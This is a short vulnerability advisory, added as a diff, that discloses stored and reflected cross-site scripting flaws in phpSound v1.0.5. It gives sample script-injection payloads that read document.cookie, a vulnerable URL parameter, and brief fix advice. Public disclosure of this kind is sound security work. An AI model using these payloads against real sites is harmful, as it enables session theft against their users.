@@ -1,0 +1,30 @@
+# Exploit Title: phpSound Music Sharing Platform Multiple XSS Vulnerabilities
+# Date: 08-10-2014
+# Exploit Author: Halil Dalabasmaz
+# Version: v1.0.5
+# Vendor Link: http://codecanyon.net/item/phpsound-music-sharing-platform/9016117
+# Software Test Link: http://phpsound.com/demo
+
+# Vulnerabilities Description:
+
+===Stored XSS===
+Create a Playlist and then you can run any XSS payload on "Title" or "Description" input fields.
+
+Sample Payload for Stored XSS: "><script>alert(document.cookie);</script>
+
+Solution
+Filter the input fields aganist to XSS attacks.
+
+===
+
+===Reflected XSS===
+
+The URL parameter is "filter" not filtered. 
+
+http://server/path/index.php?a=explore&filter=XSS
+
+Sample Payload for XSS: </title><script>alert(document.cookie);</script>
+
+Solution
+Filter the parameter aganist to XSS attacks.
+===
